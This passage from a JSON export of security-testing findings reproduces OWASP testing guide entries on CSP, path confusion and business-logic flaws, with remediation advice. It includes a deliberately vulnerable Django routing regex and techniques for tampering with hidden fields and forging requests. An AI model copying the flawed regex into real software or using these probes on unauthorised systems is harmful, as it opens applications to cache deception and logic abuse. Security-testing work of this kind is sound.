a strict policy.\n\n## Remediation\n\nConfigure a strong content security policy which reduces the attack surface of the application. Developers can verify the strength of content security policy using online tools such as [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/).\n\n### Strict Policy\n\nA strict policy is a policy which provides protection against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.\nGoogle went ahead and set up a guide to adopt a strict CSP based on nonces. Based on a presentation at [LocoMocoSec](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55), the following two policies can be used to apply a strict policy:\nModerate Strict Policy:\n\n\u0060\u0060\u0060\nscript-src \u0027nonce-r4nd0m\u0027 \u0027strict-dynamic\u0027;\nobject-src \u0027none\u0027; base-uri \u0027none\u0027;\n\u0060\u0060\u0060\n\nLocked down Strict Policy:\n\n\u0060\u0060\u0060\nscript-src \u0027nonce-r4nd0m\u0027;\nobject-src \u0027none\u0027; base-uri \u0027none\u0027;\n\u0060\u0060\u0060\n\n* \u0060script-src\u0060 directive is used to restrict the sources from which scripts can be loaded and executed.\n* \u0060object-src\u0060 directive is used to restrict the sources from which objects can be loaded and executed.\n* \u0060base-uri\u0060 directive specifies the base URL for resolving relative URLs in the page. Without this directive, the page becomes vulnerable to HTML base tag injection attacks.\n\n## Tools\n\n* [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)\n* [CSP Auditor - Burp Suite Extension](https://portswigger.net/bappstore/35237408a06043e9945a11016fcbac18)\n* [CSP Generator Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc) / [Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)\n* [Mozilla Developer Network: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)\n* [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)\n* [CSP with Google](https://csp.withgoogle.com/docs/index.html)\n* [Content-Security-Policy](https://content-security-policy.com/)\n* [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)\n* [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)\n* [The unsafe-hashes Source List Keyword](https://content-security-policy.com/unsafe-hashes/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-CONF-13 Test Path Confusion","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nProper configuration of application paths is important because, if paths are not configured correctly, they allow an attacker to exploit other vulnerabilities at a later stage using this misconfiguration.\nFor example, if the routes are not configured correctly and the target also uses a CDN, the attacker can use this misconfiguration to execute web cache deception attacks.\nAs a result, to prevent other attacks, this configuration should be evaluated by the tester.","TestingInstructions":"## Test Objectives\n\n* Make sure application paths are configured correctly.\n\n## How To Test\n\n### Black-Box Testing\n\nIn a black-box testing scenario, the tester should replace all the existing paths with paths that do not exist, and then examine the behavior and status code of the target.\nFor example, there is a path in the application that is a dashboard and shows the amount of the user\u2019s account balance (money, game credits, etc).\nAssume the path is \u0060https://example.com/user/dashboard\u0060, the tester should test the different modes that the developer may have considered for this path. For Web Cache Deception vulnerabilities the analyst should consider a path such as \u0060https:// example.com/user/dashboard/non.js\u0060 if dashboard information is visible, and the target uses a CDN (or other web cache), then Web Cache Deception attacks are likely applicable.\n\n### White-Box Testing\n\nExamine the application routing configuration, Most of the time, developers use regular expressions in application routing.\nIn this example, in the \u0060urls.py\u0060 file of a Django framework application, we see an example of Path Confusion. The developer did not use the correct regular expression resulting in a vulnerability:\n\n\u0060\u0060\u0060\n    from django.urls import re_path\n    from . import views\n\n    urlpatterns = [\n\n        re_path(r\u0027.*^dashboard\u0027, views.path_confusion ,name = \u0027index\u0027),\n\n    ]\n\u0060\u0060\u0060\n\nIf the path \u0060https://example.com/dashboard/none.js\u0060 is also opened by the user in the browser, the user dashboard information can be displayed, and if the target uses a CDN or web cache, a Web Cache Deception attack can be implemented.\n\n## Tools\n\n* [Zed Attack Proxy](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/burp)\n\n\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n* Refrain from classify/handling cached based on file extension or path (leverage content-type).\n* Ensure the caching mechanism(s) adhere to cache-control headers specified by your application.\n* Implement RFC compliant File Not Found handling and redirects.","References":"## References\n\n* [Bypassing Web Cache Poisoning Countermeasures](https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures)\n* [Path confusion: Web cache deception threatens user information online](https://portswigger.net/daily-swig/path-confusion-web-cache-deception-threatens-user-information-online)\n* [Web Cache Deception Attack](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"02-Configuration and Deployment Management Testing","Description":"02-Configuration and Deployment Management Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"30e63a8e-069a-4073-b102-2ee34c39e583","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-01 Test Business Logic Data Validation","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"The application must ensure that only logically valid data can be entered at the frontend as well as directly to the server-side of an application or system. Only verifying data on the client/frontend may leave applications vulnerable to server injections through proxies or at handoffs with other systems. This is different from simply performing Boundary Value Analysis (BVA) in that it is more difficult and in most cases cannot be simply verified at the entry point, but usually requires checking some other system.\nFor example: An application may ask for your Social Security Number. In BVA, the application should check formats and semantics (is the value 9 digits long, not negative, and not all 0\u2019s) for the data entered, but there are logic considerations also. SSNs are grouped and categorized. Is this person on a death file? Are they from a certain part of the country?\nVulnerabilities related to business data validation is unique in that they are application specific and different from the vulnerabilities related to forging requests in that they are more concerned about logical data as opposed to simply breaking the business logic workflow.\nThe frontend and the backend of the application should be verifying and validating that the data it has, is using, and is passing along is logically valid. Even if the user provides valid data to an application the business logic may make the application behave differently depending on data or circumstances.\n\n### Example 1\n\nSuppose you manage a multi-tiered e-commerce site that allows users to order carpet. The user selects their carpet, enters the size, makes the payment, and the frontend application has verified that all entered information is correct and valid for contact information, size, make and color of the carpet. But, the business logic in the background has two paths, if the carpet is in stock it is directly shipped from your warehouse, but if it is out of stock in your warehouse a call is made to a partner\u2019s system and if they have it in-stock they will ship the order from their warehouse and reimbursed by them. What happens if an attacker is able to continue a valid in-stock transaction and send it as out-of-stock to your partner? What happens if an attacker is able to get in the middle and send messages to the partner warehouse ordering carpet without payment?\n\n### Example 2\n\nMany credit card systems are now downloading account balances nightly so the customers can check out more quickly for amounts under a certain value. The inverse is also true. If I pay my credit card off in the morning I may not be able to use the available credit in the evening. Another example may be if I use my credit card at multiple locations very quickly it may be possible to exceed my limit if the systems are basing decisions on last night\u2019s data.\n\n### Example 3\n\n**[Distributed Denial of Dollar (DDo$)](https://news.hitb.org/content/pirate-bay-proposes-distributed-denial-dollars-attack-ddo):** This was a campaign that was proposed by the founder of the site \u201CThe Pirate Bay\u201D against the law firm who brought prosecutions against \u201CThe Pirate Bay\u201D. The goal was to take advantage of errors in the design of business features and in the process of credit transfer validation.\nThis attack was performed by sending very small amounts of money of 1 SEK ($0.13 USD) to the law firm. The bank account to which the payments were directed had only 1000 free transfers, after which any transfers have a surcharge for the account holder (2 SEK). After the first thousand internet transactions every 1 SEK donation to the law firm will actually end up costing it 1 SEK instead.\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Identify data injection points.\n* Validate that all checks are occurring on the backend and can\u2019t be bypassed.\n* Attempt to break the format of the expected data and analyze how the application is handling it.\n\n## How to Test\n\n### Generic Test Method\n\n* Review the project documentation and use exploratory testing looking for data entry points or hand off points between systems or software.\n* Once found try to insert logically invalid data into the application/system. Specific Testing Method:\n* Perform frontend GUI Functional Valid testing on the application to ensure that the only \u201Cvalid\u201D values are accepted.\n* Using an intercepting proxy observe the HTTP POST/GET looking for places that variables such as cost and quality are passed. Specifically, look for \u201Chand-offs\u201D between application/systems that may be possible injection or tamper points.\n* Once variables are found start interrogating the field with logically \u201Cinvalid\u201D data, such as social security numbers or unique identifiers that do not exist or that do not fit the business logic. This testing verifies that the server functions properly and does not accept logically invalid data.\n\n## Related Test Cases\n\n* All [Input Validation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README) test cases.\n* [Testing for Account Enumeration and Guessable User Account](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account).\n* [Testing for Bypassing Session Management Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema).\n* [Testing for Exposed Session Variables](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables).\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/burp)\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nThe application/system must ensure that only \u201Clogically valid\u201D data is accepted at all input and hand off points of the application or system and data is not simply trusted once it has entered the system.\n\n## ","References":"* [OWASP Proactive Controls (C5) - Validate All Inputs](https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs)\n* [OWASP Cheatsheet Series - Input_Validation_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-02 Test Ability to Forge Requests","Severity":"High","FoundDate":"2024-06-26T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Forging requests is a method that attackers use to circumvent the frontend GUI application to directly submit information for backend processing. The goal of the attacker is to send HTTP POST/GET requests through an intercepting proxy with data values that are not supported, guarded against, or expected by the application\u2019s business logic. Some examples of forged requests include exploiting guessable or predictable parameters or exposing \u201Chidden\u201D features and functionality such as enabling debugging or presenting special screens or windows that are very useful during development but may leak information or bypass the business logic.\nVulnerabilities related to the ability to forge requests are unique to each application and different from business logic data validation in that its focus is on breaking the business logic workflow.\nApplications should have logic checks in place to prevent the system from accepting forged requests that may allow attackers the opportunity to exploit the business logic, process, or flow of the application. Request forgery is nothing new; the attacker uses an intercepting proxy to send HTTP POST/GET requests to the application. Through request forgeries attackers may be able to circumvent the business logic or process by finding, predicting and manipulating parameters to make the application think a process or task has or has not taken place.\nAlso, forged requests may allow subversion of programmatic or business logic flow by invoking \u201Chidden\u201D features or functionality such as debugging initially used by developers and testers sometimes referred to as an [\u201CEaster egg\u201D](https://en.wikipedia.org/wiki/Easter_egg_(media)). \u201CAn Easter egg is an intentional inside joke, hidden message, or feature in a work such as a computer program, movie, book, or crossword. According to game designer Warren Robinett, the term was coined at Atari by personnel who were alerted to the presence of a secret message which had been hidden by Robinett in his already widely distributed game, Adventure. The name has been said to evoke the idea of a traditional Easter egg hunt.\u201D\n\n### Example 1\n\nSuppose an e-commerce theater site allows users to select their ticket, apply a onetime 10% Senior discount on the entire sale, view the subtotal and tender the sale. If an attacker is able to see through a proxy that the application has a hidden field (of 1 or 0) used by the business logic to determine if a discount has been taken already or not. The attacker is then able to submit the 1 or \u201Cno discount has been taken\u201D value multiple times to take advantage of the same discount multiple times.\n\n### Example 2\n\nSuppose an online video game pays out tokens for points scored for finding pirate\u2019s treasure, pirates, and for each level completed. These tokens can later be exchanged for prizes. Additionally each level\u2019s points have a multiplier value equal to the level. If an attacker was able to see through a proxy that the application has a hidden field used during development and testing to quickly get to the highest levels of the game they could quickly get to the highest levels and accumulate unearned points quickly.\nAlso, if an attacker was able to see through a proxy that the application has a hidden field used during development and testing to enable a log that indicated where other online players, or hidden treasures were in relation to the attacker, they would then be able to quickly go to these locations and score points.","TestingInstructions":"## Test Objectives\n\n* Review the project documentation looking for guessable, predictable, or hidden functionality of fields.\n* Insert logically valid data in order to bypass normal business logic workflow.\n\n## How to Test\n\n### Through Identifying Guessable Values\n\n* Using an intercepting proxy observe the HTTP POST/GET looking for some indication that values are incrementing at a regular interval or are easily guessable.\n* If it is found that some value is guessable this value may be changed and one may gain unexpected visibility.\n\n### Through Identifying Hidden Options\n\n* Using an intercepting proxy observe the HTTP POST/GET looking for some indication of hidden features such as debug that can be switched on or activated.\n* If any are found try to guess and change these values to get a different application response or behavior.\n\n## Related Test Cases\n\n* [Testing for Exposed Session Variables](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables)\n* [Testing for Cross Site Request Forgery (CSRF)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)\n* [Testing for Account Enumeration and Guessable User Account](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account)\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/burp)","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nThe application must be smart enough and designed with business logic that will prevent attackers from predicting and manipulating parameters to subvert programmatic or business logic flow, or exploiting hidden/undocumented functionality such as debugging.\n\n## ","References":"* [Cross Site Request Forgery - Legitimizing Forged Requests](http://www.stan.gr/2012/11/cross-site-request-forgery-legitimazing.html)\n* [Easter egg](https://en.wikipedia.org/wiki/Easter_egg_(media))\n* [Top 10 Software Easter Eggs](https://lifehacker.com/371083/top-10-software-easter-eggs)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/26/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-03 Test Integrity Checks","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Many applications are designed to display different fields depending on the user or situation by leaving some inputs hidden. However, in many cases it is possible to submit hidden field values to the server using a proxy. In these cases the server-side controls must be smart enough to perform relational or server-side edits to ensure that the proper data is allowed to the server based on user and application specific business logic.\nAdditionally, the application must not depend on non-editable controls, drop-down menus or hidden fields for business logic processing because these fields remain non-editable only in the context of the browsers. Users may be able to edit their values using proxy editor tools and try to manipulate business logic. If the application exposes values related to business rules like quantity, etc. as non-editable fields, it must maintain a copy on the server-side and use the same for business logic processing. Finally, aside from application/system data, log systems must be secured to prevent read, writing, and updating.\nBusiness logic integrity check vulnerabilities are unique in that these misuse cases are application specific and if users are able to make changes, one should only be able to write or update/edit specific artifacts at specific times as per the business process logic.\nThe application must be smart enough to check for relational edits and not allow users to submit information directly to the server that is not valid, trusted because it came from a non-editable controls or the user is not authorized to submit through the frontend. Additionally, system artifacts such as logs must be \u201Cprotected\u201D from unauthorized read, writing and removal.\n\n### Example 1\n\nImagine an ASP.NET GUI application that only allows the admin user to change the password for other users in the system. The admin user will see the username and password fields to enter a username and password while other users will not see either field. However, if a non admin user submits information in the username and password field through a proxy they may be able to \u201Ctrick\u201D the server into believing that the request has come from an admin user and change password of other users.\n\n### Example 2\n\nMost web applications have dropdown lists making it easy for the user to quickly select their state, month of birth, etc. Suppose a Project Management application allowed users to login and depending on their privileges presented them with a drop down list of projects they have access to. What happens if an attacker finds the name of another project that they should not have access to and submits the information via a proxy. Will the application give access to the project? They should not have access even though they skipped an authorization business logic check.\n\n### Example 3\n\nSuppose the motor vehicle administration system required an employee initially verify each citizens\u2019 documentation and information when they issue an identification or driver\u2019s license. At this point the business process has created data with a high level of integrity as the integrity of submitted data is checked by the employees. Now suppose the application is moved to the internet so employees can log on for full service or citizens can log on for a reduced self-service application to update certain information. At this point an attacker may be able to use an intercepting proxy to add or update data that they should not have access to and they could destroy the integrity of the data by stating that the citizen was not married but supplying data for a spouse\u2019s name. This type of inserting or updating of unverified data destroys the data integrity and might have been prevented if the business process logic was followed.\n\n### Example 4\n\nMany systems include logging for auditing and troubleshooting purposes. But, how good/valid is the information in these logs? Can they be manipulated by attackers either intentionally or accidentally having their integrity destroyed?","TestingInstructions":"## Test Objectives\n\n* Review the project documentation for components of the system that move, store, or handle data.\n* Determine what type of data is logically acceptable by the component and what types the system should guard against.\n* Determine who should be allowed to modify or read that data in each component.\n* Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.\n\n## How to Test\n\n### Specific Testing Method 1\n\n* Using a proxy capture HTTP traffic looking for hidden fields.\n* If a hidden field is found, see how these fields compare with the GUI application and start interrogating this value through the proxy by submitting different data values trying to circumvent the business process and manipulate values you were not intended to have access to.\n\n### Specific Testing Method 2\n\n* Using a proxy capture HTTP traffic looking for a place to insert information into areas of the application that are non-editable.\n* If it is found, see how these fields compare with the GUI application and start interrogating this value through the proxy by submitting different data values trying to circumvent the business process and manipulate values you were not intended to have access to.\n\n### Specific Testing Method 3\n\n* List components of the application or system that could be impacted, for example logs or databases.\n* For each component identified, try to read, edit or remove its information. For example log files should be identified and Testers should try to manipulate the data/information being collected.\n\n## Related Test Cases\n\nAll [Input Validation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README) test cases.\n\n## Tools\n\n* Various system/application tools such as editors and file manipulation tools.\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/burp)","Details":null,"Implication":null,"Recommendation":"The application should follow strict access controls on how data and artifacts can be modified and read, and through trusted channels that ensure the integrity of the data. Proper logging should be set in place to review and ensure that no unauthorized access or modification is happening.","References":"* [Implementing Referential Integrity and Shared Business Logic in a RDB](http://www.agiledata.org/essays/referentialIntegrity.html)\n* [On Rules and Integrity Constraints in Database Systems](https://www.comp.nus.edu.sg/~lingtw/papers/IST92.teopk.pdf)\n* [Use referential integrity to enforce basic business rules in Oracle](https://www.techrepublic.com/article/use-referential-integrity-to-enforce-basic-business-rules-in-oracle/)\n* [Maximizing Business Logic Reuse with Reactive Logic](https://dzone.com/articles/maximizing-business-logic)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-04 Test for Process Timing","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"It is possible that attackers can gather information on an application by monitoring the time it takes to complete a task or give a response. Additionally, attackers may be able to manipulate and break designed business process flows by simply keeping active sessions open and not submitting their transactions in the \u201Cexpected\u201D time frame.\nProcess timing logic vulnerabilities are unique in that these manual misuse cases should be created considering execution and transaction timing that are application/system specific.\nProcessing timing may give/leak information on what is being done in the application/system background processes. If an application allows users to guess what the particular next outcome will be by processing time variations, users will be able to adjust accordingly and change behavior based on the expectation and \u201Cgame the system\u201D.\n\n### Example 1\n\nVideo gambling/slot machines may take longer to process a transaction just prior to a large payout. This would allow astute gamblers to gamble minimum amounts until they see the long process time which would then prompt them to bet the maximum.\n\n### Example 2\n\nMany system log on processes ask for the username and password. If you look closely you may be able to see that entering an invalid username and invalid user password takes more time to return an error than entering a valid username and invalid user password. This may allow the attacker to know if they have a valid username and not need to rely on the GUI message.\n![Example Control Flow of Login Form](Image Not Found)\n*Figure 4.10.4-1: Example Control Flow of Login Form*\n\n### Example 3\n\nMost Arenas or travel agencies have ticketing applications that allow users to purchase tickets and reserve seats. When the user requests the tickets, seats they pick are locked or reserved pending payment. What if an attacker keeps reserving seats but not checking out? Will the seats be released, or will no tickets be sold? Some ticket vendors now only allow users 5 minutes to complete a transaction or the transaction is invalidated.\n\n### Example 4\n\nSuppose a precious metals e-commerce site allows users to make purchases with a price quote based on market price at the time they log on. What if an attacker logs on and places an order but does not complete the transaction until later in the day only if the price of the metals goes up? Will the attacker get the initial lower price?","TestingInstructions":"## Test Objectives\n\n* Review the project documentation for system functionality that may be impacted by time.\n* Develop and execute misuse cases.\n\n## How to Test\n\nThe tester should identify which processes are dependent on time, whether it was a window for a task to be completed, or if it was execution time between two processes that could allow the bypass of certain controls.\nFollowing that, it is best to automate the requests that will abuse the above discovered processes, as tools are better fit to analyze the timing and are more precise than manual testing. If this is not possible, manual testing could still be used.\nThe tester should draw a diagram of how the process flows, the injection points, and prepare the requests before hand to launch them at the vulnerable processes. Once done, close analysis should be done to identify differences in the process execution, and if the process is misbehaving against the agreed upon business logic.\n\n## Related Test Cases\n\n* [Testing for Cookies Attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)\n* [Test Session Timeout](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout)\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":"Develop applications with processing time in mind. If attackers could possibly gain some type of advantage from knowing the different processing times and results add extra steps or processing so that no matter the results they are provided in the same time frame.\nAdditionally, the application/system must have mechanism in place to not allow attackers to extend transactions over an \u201Cacceptable\u201D amount of time. This may be done by canceling or resetting transactions after a specified amount of time has passed like some ticket vendors are now using.","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/27/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"10-Business Logic Testing","Description":"10-Business Logic Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"f58ff6e0-7813-4aca-b0f4-e587d53c782d","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-BUSL-05 Test Number of Times a Function Can Be Used Limits","Severity":"High","FoundDate":"2024-06-27T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"Many of the problems that applications are solving require limits to the number of times a function can be used or action can be executed. Applications must be \u201Csmart enough\u201D to not allow the user to exceed their limit on the use of these functions since in many cases each time the function is used the user may gain some type of benefit that must be accounted for to properly compensate the owner. For example: an eCommerce site may only allow a users apply a discount once per transaction, or some applications may be on a subscription plan and only allow users to download three complete documents monthly.\nVulnerabilities related to testing for the function limits are application specific and misuse cases must be created that strive to exercise parts of the application/functions/actions more than the allowable number of times.\nAttackers may be able to circumvent the business logic and execute a function more times than \u201Callowable\u201D exploiting the application for personal gain.\n\n### 